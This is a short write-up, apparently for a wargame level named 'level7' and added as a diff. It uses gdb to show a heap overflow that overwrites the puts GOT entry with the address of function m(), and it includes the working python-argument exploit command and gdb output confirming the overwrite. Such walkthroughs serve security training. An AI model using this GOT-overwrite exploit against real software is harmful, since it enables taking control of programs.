@@ -1,0 +1,30 @@
+The binary takes 2 arguments.
+There are calls to malloc followed by strcpy followed by a call to puts.
+
+(gdb) disas puts
+Dump of assembler code for function puts@plt:
+0x08048400 <+0>:     jmp    *0x8049928
+0x08048406 <+6>:     push   $0x28
+0x0804840b <+11>:    jmp    0x80483a0
+
+Let's use a heap overflow to change the content of 0x8049928.
+0x8049928 normally contains :
+(gdb) x/x 0x8049928
+0x8049928 <puts@got.plt>:       0x08048406
+
+The goal is to change 0x08048406 to the address of function m().
+(gdb) i func
+0x080484f4  m
+
+Solution :
+
+The first argument will be used to overflow and specify where to write, the second argument will be what to write.
+
+./level7 `python -c 'print "A" * 20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+
+Ran again with gdb :
+
+(gdb)  x/x 0x8049928
+0x8049928 <puts@got.plt>:       0x080484f4
+
+We can see that 0x08048406 was changed to 0x080484f4.
